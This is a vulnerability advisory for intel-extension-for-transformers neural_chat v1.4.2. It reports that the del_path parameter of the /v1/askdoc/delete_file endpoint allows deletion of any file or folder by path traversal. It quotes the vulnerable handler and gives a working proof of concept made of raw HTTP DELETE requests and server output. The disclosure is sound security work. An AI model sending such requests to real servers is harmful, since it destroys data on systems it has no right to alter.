---
layout: post
title:  "Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat"
date:  2024-05-27 10:31:06 +0800
categories: file-deletion
---

## Name

> Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat


## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)

## Version

> v1.4.2

## Description

The post route [`/v1/askdoc/delete_file`](https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L598) endpoint in intel-extension-for-transformers [neural_chat](https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction) is vulnerable to a path traversal vulnerability through the `del_path` parameter which allows the deletion of arbitrary file. The `del_path` is directly append to a directory path [without sanitization](https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621) and then the file is deleted. An attacker can delete files behalf of current process.

The vulnerable function [`retrieval_add_files`](https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30):

```
@router.delete("/v1/askdoc/delete_file")
async def delete_single_file(request: Request):
    """Delete file according to `del_path` and `knowledge_base_id`.

    `del_path`:
        - specific file path(e.g. /path/to/file.txt)
        - folder path(e.g. /path/to/folder)
        - "all_files": delete all files of this knowledge base
    """
    params = await request.json()
    del_path = params['del_path']
    ...
    # partially delete files/folders from the kb
    if delete_path.exists():
        # delete file
        if delete_path.is_file():
            try:
                delete_path.unlink()
            except Exception as e:
                logger.info(f"[askdoc - delete_file] fail to delete file {delete_path}: {e}")
                raise HTTPException(
                    status_code=500,
                    detail=f'Failed to delete file {delete_path}. Exception: {e}'
                )
        # delete folder
        else:
            try:
                shutil.rmtree(delete_path)
            except Exception as e:
                logger.info(f"[askdoc - delete_file] fail to delete folder {delete_path}: {e}")
                raise HTTPException(
                    status_code=500,
                    detail=f'Failed to delete folder {delete_path}. Exception: {e}'
                )
        return {"status": True}
    else:
        raise HTTPException(status_code=404, detail="File/folder not found. Please check del_path.")
```

## Proof of Concept

First, we create a test file at `/home/kali/test.txt`:

```
kali@fc7d9ff6a411:/# touch /home/kali/test.txt
kali@fc7d9ff6a411:/# ls /home/kali/test.txt
-rw-r--r-- 1 kali kali 0 May 27 16:29 /home/kali/test.txt
```

Then we start a default neural_chat server following tutorial from [https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation](https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation):

```
# Install system requirements
sudo apt-get update
sudo apt-get install -y python3-pip
sudo apt-get install -y libgl1-mesa-glx

# clone the project
git clone https://github.com/intel/intel-extension-for-transformers.git
cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/

# Install python requirements
pip install -r requirements_cpu.txt
pip install fastapi==0.103.2
pip install intel-extension-for-transformers
```

Start neural_chat server, the service is open at `0.0.0.0:8000`

```
# start neural_chat server, it will download model from internet for first time, be patient.
neuralchat_server start --config_file ./server/config/neuralchat.yaml
```

Send follow post request to the server using burpsuite to delete single file:

```
DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
Host: 10.15.0.5:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
content-type: application/json
Cookie: 
Connection: close
Content-Length: 89

{"del_path":"/home/kali/test.txt","knowledge_base_id":"123"}
```

The response indicates the file is deleted.

```
HTTP/1.1 200 OK
Content-Length: 15
Connection: keep-alive
Content-Type: application/json
Date: Mon, 27 May 2024 06:26:58 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Server: uvicorn

{"status":true}
```

We can verify the the file is deleted using following command:

```
kali@fc7d9ff6a411:/# ls /home/kali/test.txt
ls: cannot access '/home/kali/test.txt': No such file or directory
```

Delete a folder using following command:

```
DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
Host: 10.15.0.5:8000
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
content-type: application/json
Cookie: 
Connection: close
Content-Length: 89

{"del_path":"/home/kali/test-folder","knowledge_base_id":"123"}
```

## Impact

This vulnerability can delete any files and folders the service process could access.


## Occurrences

[https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621](https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621)

